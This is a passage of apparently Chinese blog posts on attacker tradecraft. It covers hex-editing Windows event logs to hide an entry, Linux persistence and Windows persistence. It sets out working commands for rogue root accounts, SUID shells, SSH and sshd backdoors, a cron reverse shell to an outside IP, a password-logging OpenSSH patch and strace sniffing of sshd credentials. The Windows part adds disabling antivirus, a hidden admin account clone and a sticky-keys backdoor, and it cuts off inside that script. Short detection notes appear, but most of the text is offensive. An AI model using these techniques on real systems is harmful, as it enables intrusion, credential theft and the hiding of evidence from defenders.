<h5 id="修改Event-Record"><a href="#修改Event-Record" class="headerlink" title="修改Event Record"></a>修改Event Record</h5><h5 id="重新计算待删除Event-Record前后长度，更新后续Event-Record的Event-record-identifier"><a href="#重新计算待删除Event-Record前后长度，更新后续Event-Record的Event-record-identifier" class="headerlink" title="重新计算待删除Event Record前后长度，更新后续Event Record的Event record identifier"></a>重新计算待删除Event Record前后长度，更新后续Event Record的Event record identifier</h5><p><img src="/posts/41ffc4f2/8.png"></p>
<p>Event record头为 0x2a\0x2a\0x00\0x00 在010editor搜索一下 找到Event record头</p>
<p>途中的 0x0778 对应值为 1912 这个是日志中的第一条日志，这里要删除1915 那么去找到  0x077b值对应的EventRecord（第四条日志）</p>
<p><img src="/posts/41ffc4f2/10.png" alt="第四条日志"></p>
<p>长度为 0x0138h  EventRecord ID 为 0x77bh(1915)</p>
<p>结尾处的值为EventRecord 长度 0x138h 在后面需要覆盖后也要修改这个值</p>
<p>再找到第三条日志</p>
<p><img src="/posts/41ffc4f2/11.png"></p>
<p>长度为 0x0480h EventRecord ID为 0x77ah (1914)</p>
<p>找到两条日志后 修改一下 第三条日志的长度 使其覆盖掉第四条日志</p>
<p>New_legth = 0x138h+0x480h=0x5b8h</p>
<p><img src="/posts/41ffc4f2/12.png"></p>
<p>然后更新第四条日志最后面的长度 从0x138h 改为 0x5b8h</p>
<p><img src="/posts/41ffc4f2/13.png"></p>
<h5 id="更新ElfChnk"><a href="#更新ElfChnk" class="headerlink" title="更新ElfChnk"></a>更新ElfChnk</h5><p><img src="/posts/41ffc4f2/15.png"></p>
<p><img src="/posts/41ffc4f2/16.png"></p>
<p><a href="https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header">https://github.com/libyal/libevtx/blob/main/documentation/Windows%20XML%20Event%20Log%20(EVTX).asciidoc#31-chunk-header</a></p>
<p>在测试日志中只有一个Elfchnk 但别的可能会有多个ElfChnk 需要找到对应的 ElfChnk </p>
<p><img src="/posts/41ffc4f2/14.png"></p>
<p>修改<code>last Event record number</code>  0x04h -1 =  0x03h </p>
<p>修改<code>last Event record identifier</code> 0x77bh -1 = 0x77ah </p>
<p>修改<code>Last event record data offset</code>  0x1248h =&gt;  0xDC8h</p>
<p>为第三条Event Record(最后一条)相对于ElfChuk的偏移长度   </p>
<p>ElfChnk 为 0x1000h 第三条开始位置为 0x1DC8h  所以偏移量为 0xDC8h</p>
<p>修改<code>Event records checksum</code> 0xD3D3DE43h =&gt;  0xF92FEDB9h</p>
<p><code>Event records checksum</code> 为所有Event records 的校验和 这里需要计算三条的 </p>
<p>计算过程 抽时间算一下 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~`</p>
<p>计算后为 <code>0xF92FEDB9h</code></p>
<p>修改<code> Checksum</code>  0xEB4C47BFh =&gt; 0x3CE0BF8h</p>
<p>计算前120 和128-512 处的CRC32值  结果为 <code>0x3CE0BF8h</code></p>
<p><img src="/posts/41ffc4f2/17.png"></p>
<p>另存后打开 可以看到 第四条我们想要删除的日志已经成功隐藏</p>
<p><img src="/posts/41ffc4f2/18.png"></p>
]]></content>
      <categories>
        <category>痕迹清理</category>
      </categories>
      <tags>
        <tag>痕迹清理</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持-Linux篇</title>
    <url>/posts/29801cba/</url>
    <content><![CDATA[<h3 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h3><h4 id="0x00-隐藏技巧"><a href="#0x00-隐藏技巧" class="headerlink" title="0x00 隐藏技巧"></a>0x00 隐藏技巧</h4><h5 id="修改文件-终端属性"><a href="#修改文件-终端属性" class="headerlink" title="修改文件/终端属性"></a>修改文件/终端属性</h5><p>修改文件的生成时间</p>
<p><code>touch -r index.php shell.php</code></p>
<p>touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件</p>
<h5 id="文件锁定"><a href="#文件锁定" class="headerlink" title="文件锁定"></a>文件锁定</h5><p>Linux中使用<code>chattr</code>命令来防止root和其他管理用户误删除和修改重要文件以及目录，此权限是用<code>ls -l</code>查看不出来的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chattr +i test.php #锁定文件</span><br><span class="line">rm -rf test.php #提示禁止删除文件</span><br><span class="line"></span><br><span class="line">lsattr test.php #属性查看</span><br><span class="line">chattr -i test.php #解除锁定</span><br><span class="line">rm -rf test.php #彻底删除文件</span><br></pre></td></tr></table></figure>

<h5 id="历史操作命令"><a href="#历史操作命令" class="headerlink" title="历史操作命令"></a>历史操作命令</h5><p><code>[space]set +o history #备注：[space]表示空格。并且由于空格的原因，该命令本身也不会被记录。</code></p>
<p>上面的命令会临时禁用历史功能，即执行后的命令不会记录在历史中</p>
<p><code>[space]set -o history #将环境恢复原状</code></p>
<p>删除历史记录中的指定命令</p>
<p><code>history | grep &quot;keyword&quot;</code></p>
<p>输出了历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
<p><code>history -d [num] </code></p>
<p>大规模删除历史操作记录</p>
<p><code>set -i &#39;150,$d&#39; .bash_history   #只保留前150行</code></p>
<h4 id="0x01-添加用户"><a href="#0x01-添加用户" class="headerlink" title="0x01 添加用户"></a>0x01 添加用户</h4><h5 id="添加普通用户"><a href="#添加普通用户" class="headerlink" title="添加普通用户"></a>添加普通用户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest</span><br><span class="line"># useradd -p 方法 &#96; &#96; 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#39;guest:123456&#39;|chpasswd</span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>

<h5 id="添加root用户"><a href="#添加root用户" class="headerlink" title="添加root用户"></a>添加root用户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p &#96;openssl passwd -1 -salt &#39;salt&#39; 123456&#96; guest -o -u 0 -g root -G root</span><br><span class="line">-s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;test</span><br></pre></td></tr></table></figure>

<h5 id="passwd写入"><a href="#passwd写入" class="headerlink" title="passwd写入"></a>passwd写入</h5><p>(注:现在较新的系统无法成功利用 在su切换用户时会提示用户不存在)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd 各部分含义：</span><br><span class="line">⽤户名：密码：⽤户ID：组ID：身份描述：⽤户的家⽬录：⽤户登录后所使⽤的SHELL</span><br><span class="line">&#x2F;etc&#x2F;shadow 各部分含义：</span><br><span class="line">⽤户名：密码的MD5加密值：⾃系统使⽤以来⼝令被修改的天数：⼝令的最⼩修改间隔：⼝令更改的周期：⼝令失效的</span><br><span class="line">天数：⼝令失效以后帐号会被锁定多少天：⽤户帐号到期时间：保留字段尚未使⽤</span><br></pre></td></tr></table></figure>

<h6 id="添加超级用户"><a href="#添加超级用户" class="headerlink" title="添加超级用户"></a>添加超级用户</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$echo &quot;test:savbSWc4rx8NY:hacker:&#x2F;root:&#x2F;bin&#x2F;bash&quot; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但<br>是由于<code>/etc/passwd</code>文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统都使<br>用了shadow技术，把真正加密后的用户口令字段存放到<code>/etc/shadow</code>文件中，而在<code>/etc/passwd</code>文件的<br>口令字段中只存放了一个特殊的字符，例如”x”或者”*”</p>
<h6 id="如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号"><a href="#如果系统不允许uid-0的用户远程登陆，可以增加一个普通用户账号" class="headerlink" title="如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号"></a>如果系统不允许uid=0的用户远程登陆，可以增加一个普通用户账号</h6><p><code>echo &quot;test:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot; &gt;&gt; /etc/shadow</code></p>
<br>

<h5 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#39;$3&#x3D;&#x3D;0&#123;print $1&#125;&#39; &#x2F;etc&#x2F;passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#39;&#x2F;\$1|\$6&#x2F;&#123;print $1&#125;&#39; &#x2F;etc&#x2F;shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more &#x2F;etc&#x2F;sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL&#x3D;(ALL)&quot;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x02-SUID-shell"><a href="#0x02-SUID-shell" class="headerlink" title="0x02 SUID shell"></a>0x02 SUID shell</h4><p>SUID shell 是一种可用于以拥有者权限运行的shell</p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>创建suid权限的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;bin&#x2F;bash  &#x2F;tmp&#x2F;.woot</span><br><span class="line">chmod 4755 &#x2F;tmp&#x2F;.woot</span><br><span class="line">ls -al &#x2F;.woot</span><br></pre></td></tr></table></figure>

<p>这样做相当于复制了一些新的bash到tmp目录下，然后可以在使用它时调用root权限</p>
<p>使用普通用户运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;.woot</span><br><span class="line">&#x2F;tmp&#x2F;.woot -p   &#x2F;&#x2F;bash2针对suid有一些保护措施，使用-p参数来获取一个root shell</span><br></pre></td></tr></table></figure>

<h5 id="排查-1"><a href="#排查-1" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查找具有suid的权限的应用</span><br><span class="line">find &#x2F; -perm +4000 -ls</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm &#x2F;4000</span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm &#x2F;2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s &#x2F;tmp&#x2F;.woot</span><br></pre></td></tr></table></figure>

<h4 id="0x03-ssh公私钥"><a href="#0x03-ssh公私钥" class="headerlink" title="0x03 ssh公私钥"></a>0x03 ssh公私钥</h4><h5 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h5><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配，如果匹配成功就可以登录了。</p>
<p>客户端</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>进入 <code>/root/.ssh/</code>文件夹即可查看到生成公私钥，<code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，</p>
<p>将公钥复制放到目标机器上的 <code>.ssh/authorized_keys</code>中     <code>echo id_rsa.pub &gt;&gt; .ssh/authorized_keys </code> </p>
<h5 id="排查-2"><a href="#排查-2" class="headerlink" title="排查"></a>排查</h5><p>查看 <code>/root/.ssh/authoritized_keys</code>是否被修改</p>
<br>

<h4 id="0x04-软连接"><a href="#0x04-软连接" class="headerlink" title="0x04 软连接"></a>0x04 软连接</h4><h5 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h5><p>通过软连接建立一个ssh后门：</p>
<p><code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=8888</code></p>
<p>(注:如果目标在执行软连接时使用的其他账户创建的，那么在登陆时也要选择    对应的账户去登录，而非root账户)</p>
<p>执行完后 在任意机器上使用<code>ssh root@xxx.xxx.xxx.xxx -p 8888</code> 即可连接</p>
<h5 id="排查-3"><a href="#排查-3" class="headerlink" title="排查"></a>排查</h5><p>通过查看端口或者进程都会发现异常连接 使用 <code>kill -s 9 PID</code> 杀掉进程即可清除后门</p>
<p><img src="/posts/29801cba/attachment:d5517d48087cf2e1fd80aacde6f69abc" alt="截图"></p>
<br>

<h4 id="0x05-crontab反弹shell"><a href="#0x05-crontab反弹shell" class="headerlink" title="0x05 crontab反弹shell"></a>0x05 crontab反弹shell</h4><h5 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h5><p>cron表达式在线⽣成：<a href="http://qqe2.com/cron">http://qqe2.com/cron</a></p>
<ul>
<li>创建shell脚本脚本 </li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><code>chmod +sx etc/test.sh</code></p>
<ul>
<li>crontab -e 设置定时任务</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 每分钟执行一次</span><br><span class="line">*&#x2F;1 * * * * root &#x2F;etc&#x2F;test.sh</span><br></pre></td></tr></table></figure>

<p>重启crond服务就可用nc接受shell <code>service cornd restart</code></p>
<h5 id="排查-4"><a href="#排查-4" class="headerlink" title="排查"></a>排查</h5><p>查看可疑的定时任务列表</p>
<p><code>crontab -e</code></p>
<br>

<h4 id="0x06-OpenSSH-后门"><a href="#0x06-OpenSSH-后门" class="headerlink" title="0x06 OpenSSH 后门"></a>0x06 OpenSSH 后门</h4><h5 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h5><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old</span><br><span class="line">mv &#x2F;etc&#x2F;ssh&#x2F;sshd_config &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old</span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch&#x2F;sshbd5.9p1.diff &#x2F;openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi includes.h</span><br><span class="line">#define ILOG &quot;&#x2F;tmp&#x2F;1.txt&quot;           &#x2F;&#x2F;记录登录本机的用户名和密码</span><br><span class="line">#define OLOG &quot;&#x2F;tmp&#x2F;2.txt&quot;           &#x2F;&#x2F;记录本机登录远程的用户名和密码</span><br><span class="line">#define SECRETPW &quot;123456789&quot;        &#x2F;&#x2F;后门的密码</span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">#define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line">e、安装并编译</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc&#x2F;ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line">touch -r &#x2F;etc&#x2F;ssh&#x2F;ssh_config.old &#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">touch -r &#x2F;etc&#x2F;ssh&#x2F;sshd_config.old &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE&#x3D;&#x2F;dev&#x2F;null</span><br><span class="line">export HISTSIZE&#x3D;0</span><br><span class="line">echo &gt;&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;清空操作日志</span><br></pre></td></tr></table></figure>

<h5 id="排查-5"><a href="#排查-5" class="headerlink" title="排查"></a>排查</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#利用strace查找ssh后门</span><br><span class="line"># 1、获取可疑进程PID</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x07-strace后门"><a href="#0x07-strace后门" class="headerlink" title="0x07 strace后门"></a>0x07 strace后门</h4><p>strace是一个动态跟踪工具，它可以跟踪系统调用的执行。我们可以把它当作一个键盘记录的后门，来扩大我们的信息收集范围。通过其他方式拿到shell，通过histroy，流量抓包、或者本地没有翻到密码的情况下。我们要想获取当前<br>主机的密码，或者是通过这台主机连接到其他主机的密码。</p>
<h5 id="记录sshd进程明文密码"><a href="#记录sshd进程明文密码" class="headerlink" title="记录sshd进程明文密码"></a>记录sshd进程明文密码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e</span><br><span class="line">trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>当用户通过密码登陆时，使用如下命令查看记录的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -E &#39;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#39; &#x2F;tmp&#x2F;.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="记录sshd私钥"><a href="#记录sshd私钥" class="headerlink" title="记录sshd私钥"></a>记录sshd私钥</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e</span><br><span class="line">trace&#x3D;read,write -s 4096 2&gt; &#x2F;tmp&#x2F;.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>当用户通过私钥登陆时，使用如下命令查看记录的私钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &#39;PRIVATE KEY&#39; &#x2F;tmp&#x2F;.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。"><a href="#通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。" class="headerlink" title="通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。"></a>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#vim &#x2F;etc&#x2F;bashrc或者 ~&#x2F;.bashrc</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.ssh.log -e read,write,connect -s 2048 ssh&#39;</span><br><span class="line"># source ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
      <tags>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>权限维持-Windows篇(待完成)</title>
    <url>/posts/709e0d6/</url>
    <content><![CDATA[<h3 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h3><h4 id="隐藏技巧"><a href="#隐藏技巧" class="headerlink" title="隐藏技巧"></a>隐藏技巧</h4><h5 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h5><p><code>attrib +s +a +h +r c:\test</code></p>
<p>把原本的⽂件夹增加了系统⽂件属性、存档⽂件属性、只读⽂件属性和隐藏⽂件属性。</p>
<h5 id="系统文件夹图标"><a href="#系统文件夹图标" class="headerlink" title="系统文件夹图标"></a>系统文件夹图标</h5><h6 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h6><ul>
<li>1.新建文件夹 并将文件存入</li>
<li>2.修改命名为 我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D} 然后访问该文件夹，打开会打开我的电脑</li>
<li>3.如果需要查看内容 可以使用winrar 等去查看或 恢复</li>
</ul>
<h6 id="代号"><a href="#代号" class="headerlink" title="代号"></a>代号</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125;</span><br><span class="line">拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;</span><br><span class="line">打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;</span><br><span class="line">控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;</span><br><span class="line">⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br></pre></td></tr></table></figure>

<h5 id="畸形目录"><a href="#畸形目录" class="headerlink" title="畸形目录"></a>畸形目录</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#创建目录</span><br><span class="line">md a...\      &#x2F;&#x2F;三个点,实际显示为 a..</span><br><span class="line">#复制文件</span><br><span class="line">copy test a...\test</span><br><span class="line">#删除目录</span><br><span class="line">rd &#x2F;s &#x2F;q a...\</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="利用系统保留文件名创建无法删除的webshell"><a href="#利用系统保留文件名创建无法删除的webshell" class="headerlink" title="利用系统保留文件名创建无法删除的webshell"></a>利用系统保留文件名创建无法删除的webshell</h5><p>（注: 火绒就可以粉碎…）</p>
<p>Windows 下不能够以下面这些字样来命名文件/文件夹，包括：aux，com1，com2，prn，con和nul等，但是通过cmd下是可以创建此类文件夹的，使用copy命令即可实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 方法</span><br><span class="line">copy 1.jsp   \\.\E:\test\aux.jsp</span><br><span class="line">del \\.\E:\test\aux.jsp</span><br><span class="line">type \\.\E:\test\aux.jsp</span><br><span class="line"></span><br><span class="line">#可以使用attrib隐藏文件 </span><br><span class="line">#这种在设置显示隐藏文件后&#x2F;dir  也无法看到</span><br><span class="line">attrib 1.txt &#x2F;&#x2F;查看⽂件属性 </span><br><span class="line">attrib 1.txt -r -s &#x2F;&#x2F;删除⽂件属性</span><br><span class="line">attrib +H +S 1.asp 改变⽂件属性，隐藏1.asp</span><br><span class="line">attrib -H -S 1.asp </span><br></pre></td></tr></table></figure>

<h5 id="驱动级文件隐藏"><a href="#驱动级文件隐藏" class="headerlink" title="驱动级文件隐藏"></a>驱动级文件隐藏</h5><p>可以利用 <code>Easy File Locker </code> 对文件夹进行隐藏</p>
<p> 下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p>
<br>

<br>

<h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;meterperter中使用</span><br><span class="line">run killav </span><br><span class="line">&#x2F;&#x2F;关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">&#x2F;&#x2F;关闭windowsdefender</span><br><span class="line">net stop windefend </span><br></pre></td></tr></table></figure>

<p>还有几个大佬github上关杀软的项目</p>
<p><a href="https://github.com/Yaxser/Backstab">https://github.com/Yaxser/Backstab</a></p>
<p><a href="https://github.com/Yihsiwei/GetOut360">https://github.com/Yihsiwei/GetOut360</a></p>
<br>

<h4 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h4><h5 id="1-创建隐藏账户"><a href="#1-创建隐藏账户" class="headerlink" title="1.创建隐藏账户"></a>1.创建隐藏账户</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#创建完成后仍可以通过计算机管理和登录处看到该用户</span><br><span class="line">net user test$ Test.123 &#x2F;add</span><br><span class="line">net localgroup administrators test$ &#x2F;add</span><br></pre></td></tr></table></figure>

<h5 id="2-打开注册表-regedit-修改权限"><a href="#2-打开注册表-regedit-修改权限" class="headerlink" title="2.打开注册表 regedit 修改权限"></a>2.打开注册表 regedit 修改权限</h5><p><code>HKEY_LOCAL_MACHINE\SAM\SAM</code> 的adminstrator权限修改为完全控制和读取，然后重新打开注册表便可继续查看内容</p>
<h5 id="3-导出test-账户的reg-和-对应类型（0xXX的那个文件）和administrator对应十六进制的注册表"><a href="#3-导出test-账户的reg-和-对应类型（0xXX的那个文件）和administrator对应十六进制的注册表" class="headerlink" title="3.导出test$账户的reg 和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表"></a>3.导出test$账户的reg 和 对应类型（0xXX的那个文件）和administrator对应十六进制的注册表</h5><p>路径为<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code></p>
<h5 id="4-将test-对应的00000XXX-reg的-F值替换为administrator-对应00000XXX-reg的F值"><a href="#4-将test-对应的00000XXX-reg的-F值替换为administrator-对应00000XXX-reg的F值" class="headerlink" title="4.将test$对应的00000XXX.reg的 F值替换为administrator 对应00000XXX.reg的F值"></a>4.将test$对应的00000XXX.reg的 F值替换为administrator 对应00000XXX.reg的F值</h5><h5 id="5-删除test-用户"><a href="#5-删除test-用户" class="headerlink" title="5.删除test$用户"></a>5.删除test$用户</h5><p><code>net user test$ /del</code>  （删除后注册表里的test$用户就无法打开了）</p>
<h5 id="6-在cmd导入test-的两个注册表"><a href="#6-在cmd导入test-的两个注册表" class="headerlink" title="6.在cmd导入test$的两个注册表"></a>6.在cmd导入test$的两个注册表</h5><p>(这样就不会在计算机管理和登录页面看到创建的账户了，但仍可以在组成不SAM下看到,登录后会在计算机管理中显示该用户，想要清除该用户需要在注册表清除)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">regedit  &#x2F;s 1.reg</span><br><span class="line">regedit  &#x2F;s 2.reg</span><br></pre></td></tr></table></figure>

<h5 id="7-使用3389登录-会-登陆到administrator-的当前状态下-实现adminstrator账户的克隆"><a href="#7-使用3389登录-会-登陆到administrator-的当前状态下-实现adminstrator账户的克隆" class="headerlink" title="7.使用3389登录 会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆"></a>7.使用3389登录 会 登陆到administrator 的当前状态下 实现adminstrator账户的克隆</h5><br>

<h4 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h4><p>win+R    gpedit.msc 打开本地组策略编辑器<br>选择计算机管理-&gt;WIndows设置-&gt;脚本(启动/关闭)  选择启动或关闭 添加bat脚本</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">net user test<span class="variable">$</span> Test.<span class="number">123</span> /add</span><br><span class="line">net localgroup administrators test<span class="variable">$</span> /add</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h4><h5 id="Shiftkey"><a href="#Shiftkey" class="headerlink" title="Shiftkey"></a>Shiftkey</h5><p><code>Set-ExecutionPolicy Unrestricted</code></p>
<p><code>Import-Module .\shiftkey.ps1</code></p>
<p>运行一次会启动 再次运行会删除<br>在用户登录下为当前用户权限，在登录界面为system权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$registryPath</span> = <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&quot;</span> </span><br><span class="line"><span class="variable">$keyName</span> = <span class="string">&quot;sethc.exe&quot;</span> </span><br><span class="line"><span class="variable">$stringName</span> = <span class="string">&quot;Debugger&quot;</span> </span><br><span class="line"><span class="variable">$binaryValue</span> = <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line"><span class="keyword">IF</span> (<span class="built_in">Test-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>)) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment"># Sticky Keys backdoor exists.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key found. Let&#x27;s remove it.&quot;</span>    </span><br><span class="line">     <span class="comment">#New-Item -Path $registryPath -Name $keyName | Out-Null    </span></span><br><span class="line">     <span class="built_in">Remove-Item</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Key backdoor has been removed.&quot;</span>    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ELSE</span> </span><br><span class="line">&#123;    </span><br><span 